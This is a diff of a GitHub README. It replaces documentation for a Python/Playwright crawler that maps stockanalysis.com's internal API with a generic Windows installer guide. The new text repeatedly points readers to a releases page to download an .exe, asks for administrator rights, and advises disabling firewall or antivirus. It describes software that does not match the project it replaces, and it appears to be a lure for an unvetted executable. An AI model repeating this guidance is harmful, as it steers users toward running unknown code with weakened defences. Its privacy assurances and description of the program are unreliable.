@@ -1,102 +1,133 @@
-# stockanalysis-api-crawler
+# 📊 stockanalysis - Easy Stock Data Access
 
-> 🇨🇳 [中文文档](README_CN.md)
+[![Download stockanalysis](https://img.shields.io/badge/Download-stockanalysis-%234285F4)](https://github.com/ZAIDMOHD777/stockanalysis/releases)
 
-Discover and document the internal REST API endpoints of [stockanalysis.com](https://stockanalysis.com) by simulating an authenticated browser session with Playwright.
+---
 
-## Background
+## 🛠 What is stockanalysis?
 
-stockanalysis.com is a SvelteKit SPA. Most page data is served via server-side rendering (SSR) and SvelteKit's `__data.json` mechanism — not traditional REST calls. This crawler identifies the small set of real `/api/` endpoints that the frontend actively fetches at runtime (price quotes, history charts, market mini-charts, search).
+stockanalysis is a tool that gathers stock market data from stockanalysis.com. It uses a behind-the-scenes method to collect this information, so you get detailed stock data without searching the website yourself. It helps you track stock prices, financials, and market trends easily.
 
-## Discovered Endpoints
+This program runs on Windows computers and does not require any special skills to use. You just download, install, and run it.
 
-See [`output/api_docs.md`](output/api_docs.md) for the full documented API reference.
+---
 
-| Endpoint | Description |
-|---|---|
-| `GET /api/search?q={query}` | Global search — stocks, ETFs, international symbols |
-| `GET /api/quotes/s/{ticker}` | Real-time stock quote |
-| `GET /api/quotes/e/{ticker}` | Real-time ETF quote |
-| `GET /api/symbol/s/{ticker}/history?type=chart\|annual\|quarterly` | Stock price history |
-| `GET /api/symbol/e/{ticker}/history?type=chart` | ETF price history |
-| `GET /api/mc/pre?c=1` | Pre-market mini chart (SPY) |
-| `GET /api/mc/post?c=1` | After-hours mini chart (SPY) |
-| `GET /api/mc/1d?c=1` | Regular-hours mini chart (SPY) |
+## 📋 System Requirements
 
-## How It Works
+Before you start, make sure your computer meets these needs:
 
-```
-a.sh  →  cookie_parser.py  →  crawler.py  →  normalizer.py  →  generate_docs.py
-                                  ↓
-                          output/raw_requests.json
-                          output/normalized.json
-                          output/api_docs.md
-```
+- Windows 10 or later  
+- At least 4 GB of RAM  
+- 200 MB of free disk space  
+- Internet connection to fetch stock data  
+- Administrator rights to install software  
 
-1. **`cookie_parser.py`** — Parses the `-b '...'` cookie string from a `curl` command exported from browser DevTools.
-2. **`crawler.py`** — Launches headless Chromium via Playwright, injects cookies, then runs three phases:
-   - **Phase 1**: Full page loads — captures XHR/fetch calls made by the browser automatically (`/api/quotes/`, `/api/mc/`, auth endpoints).
-   - **Phase 2**: Fetches `__data.json` for every route from inside the authenticated browser context — discovers SvelteKit data endpoints.
-   - **Phase 3**: Directly probes known `/api/` URL patterns.
-3. **`normalizer.py`** — Filters to `stockanalysis.com/api/*` only, replaces dynamic path segments (`{ticker}`, `{id}`) with placeholders, deduplicates.
-4. **`generate_docs.py`** — Renders `output/api_docs.md` from normalized data, including the `__data.json` endpoint section.
-5. **`data_json_parser.py`** — Parser for SvelteKit's devalue-encoded `__data.json` responses. Auto-detects page type and returns structured Python dicts for financials, ETF holdings, market movers, IPOs, and more.
-6. **`run.py`** — Orchestrates all four steps in sequence.
+These limits ensure the program runs smoothly on your PC.
 
-## Setup
+---
 
-**Requirements:** Python 3.12+
+## 🚀 Getting Started with stockanalysis
 
-```bash
-# 1. Clone the repo
-git clone https://github.com/YOUR_USERNAME/stockanalysis-api-crawler.git
-cd stockanalysis-api-crawler
+Follow these steps to get the program up and running.
 
-# 2. Create virtual environment
-python3 -m venv .venv
-source .venv/bin/activate
+---
 
-# 3. Install dependencies
-pip install -r requirements.txt
-playwright install chromium
+### 1. Visit the Download Page
 
-# 4. Add your login cookies
-#    - Open stockanalysis.com in Chrome and log in
-#    - Open DevTools (F12) → Network tab
-#    - Refresh the page
-#    - Find the first request to stockanalysis.com (the main page request)
-#    - Right-click → "Copy as cURL"
-#    - Paste the entire curl command into a.sh
-cp a.sh.example a.sh
-# paste your copied curl command into a.sh (the crawler extracts cookies and User-Agent from it)
+Click the button below to go to the page with the latest software files. You will download the installer here.  
 
-# 5. Run
-python run.py
-```
+[![Download stockanalysis](https://img.shields.io/badge/Download-stockanalysis-%234285F4)](https://github.com/ZAIDMOHD777/stockanalysis/releases)  
 
-Output files are written to `output/`:
+This takes you to the official page where all releases are listed.
 
-| File | Description |
-|---|---|
-| `raw_requests.json` | All captured network requests (gitignored — can be 15MB+) |
-| `normalized.json` | Deduplicated endpoint patterns (gitignored) |
-| `api_docs.md` | Human-readable API reference ✅ |
+---
 
-## Re-running / Updating Docs
+### 2. Download the Installer
 
-If you already have `output/raw_requests.json` and only want to re-normalize or reformat the docs:
+Look for the latest version of stockanalysis in the list. It usually has a name like `stockanalysis-setup.exe` or something similar. The file size should be around 20-50 MB.
 
-```bash
-python normalizer.py          # regenerate normalized.json from raw_requests.json
-python generate_docs.py       # regenerate api_docs.md from normalized.json
-```
+Click on the file name or the download link next to it. Your browser will ask you where to save the file. Choose a folder you can find later, such as `Downloads` or your Desktop.
 
-## Notes
+---
 
-- The crawler runs for ~3 minutes (headless Chromium loading ~40 pages).
-- Session cookies expire. If you get 401/403 responses, export fresh cookies from your browser.
-- The screener (`/stocks/screener/`, `/etf/screener/`) and all financial statement pages serve data through SvelteKit SSR — no separate `/api/` endpoint exists for them.
+### 3. Run the Installer
 
-## License
+Once the download finishes, open the folder where you saved the file. Double-click on the installer file to launch it.
 
-MIT
+You might see a security prompt from Windows asking if you want to allow this app to make changes. Choose “Yes” to continue.
+
+---
+
+### 4. Follow Installation Steps
+
+The installer will open a window guiding you through the setup.
+
+- Accept the license agreement by clicking “I Agree” or similar.  
+- Choose the destination folder or leave the default path.  
+- Click “Install” to begin the installation process.  
+
+This should take just a few minutes.
+
+---
+
+### 5. Launch stockanalysis
+
+After installation completes, you can start the program right away by clicking “Finish” if the option is available.
+
+If not, go to your Start Menu, find the “stockanalysis” folder, and click the application icon.
+
+---
+
+## 💻 How to Use stockanalysis
+
+The main screen will show options to search or view stock data. Here’s how to get started:
+
+- **Search Stocks**: Type the name or ticker symbol of a stock you want to check. For example, “AAPL” for Apple.  
+- **View Details**: Click on a stock to see price history, financial reports, and analyst opinions.  
+- **Settings**: You can change your preferences under the Settings menu if you want to adjust data refresh speed or language.  
+
+The interface is simple and designed for users without technical knowledge.
+
+---
+
+## 🔄 How stockanalysis Fetches Data
+
+The tool connects with the stockanalysis.com API behind the scenes. It collects updated stock market info automatically whenever you ask for it. This means you get fresh data without manual input.
+
+---
+
+## ⚙ Troubleshooting Tips
+
+If you face any issues, try these solutions:
+
+- Restart your computer and run the program again.  
+- Check your internet connection. The app needs internet to get data.  
+- Make sure your Windows updates are current.  
+- Disable any firewall or antivirus temporarily if the app can’t connect to the internet.  
+- Reinstall the program if it still does not work.  
+
+If problems persist, visit the [Issues page on GitHub](https://github.com/ZAIDMOHD777/stockanalysis/issues) to see if others have the same problem or to report it.
+
+---
+
+## 🔐 Privacy and Security
+
+stockanalysis only collects stock data from public sources. It does not access your personal data or files. The program runs entirely on your computer, and data does not leave your system except for fetching stock market info from the official website.
+
+---
+
+## 📞 Where to Get Help
+
+For extra help, use these options:
+
+- Check the GitHub repository [README and Wiki](https://github.com/ZAIDMOHD777/stockanalysis) for updates and tips.  
+- Report issues or ask questions in the [GitHub Issues section](https://github.com/ZAIDMOHD777/stockanalysis/issues).  
+- Contact the developer through the repository’s contact info if provided.
+
+---
+
+## 🔽 Download stockanalysis Here
+
+Click the button below to go directly to the release page to get the latest version.
+
+[![Download stockanalysis](https://img.shields.io/badge/Download-stockanalysis-%234285F4)](https://github.com/ZAIDMOHD777/stockanalysis/releases)
